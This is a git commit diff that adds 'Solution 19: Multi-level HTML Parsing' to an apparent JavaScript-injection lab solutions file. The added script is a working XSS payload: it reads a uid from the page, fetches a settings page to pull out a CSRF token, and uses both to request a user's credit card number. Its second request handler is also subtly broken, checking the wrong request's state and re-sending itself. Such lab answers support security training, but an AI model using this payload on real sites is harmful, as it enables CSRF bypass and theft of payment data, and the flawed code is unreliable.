35d472534a812d83c5e9f9c03eb87760fe70e2d1
h3ll0clar1c3 <61941106+h3ll0clar1c3@users.noreply.github.com>
2021-06-02 21:31:21 +0200

    Update solution.js

--- solution.js
+++ solution.js
@@ -278,3 +278,48 @@ req.responseType = "document";
 req.send();
 	
 </script>
+
+
+* Solution 19: Multi-level HTML Parsing
+
+<script>
+
+var link = document.getElementById("settings");
+var req = new XMLHttpRequest();
+var csrf_token = '';
+var uid = '';
+var req2 = new XMLHttpRequest();
+req2.onreadystatechange = function ()
+
+{
+	if (req.readyState == 4 && req.status ==200)
+{
+	var htmlPage = req2.responseXML;
+	credit_card = htmlPage.getElementById("result").innerHTML;
+	
+	req2.open("GET", "/lab/webapp/jfp/19/getcreditcard?uid="+uid+"&csrf_token="+csrf_token, true);
+	req2.responseType = "document";
+	req2.send();
+}
+};
+
+req.onreadystatechange=function()
+{
+	if (req.readyState == 4 && req.status == 200)
+	{
+		var htmlPage = req.responseXML;
+		csrf_token = htmlPage.forms[0].elements[1].value;
+		alert(csrf_token);
+
+		req2.open("GET", "/lab/webapp/jfp/19/getcreditcard?uid="+uid+"&csrf_token="+csrf_token, true);
+		req2.responseType = "document";
+		req2.send();
+	}
+};
+
+uid = link.innerHTML.split(':')[1]
+req.open("GET", link.href, true);
+req.responseType = "document";
+req.send();
+	
+</script>
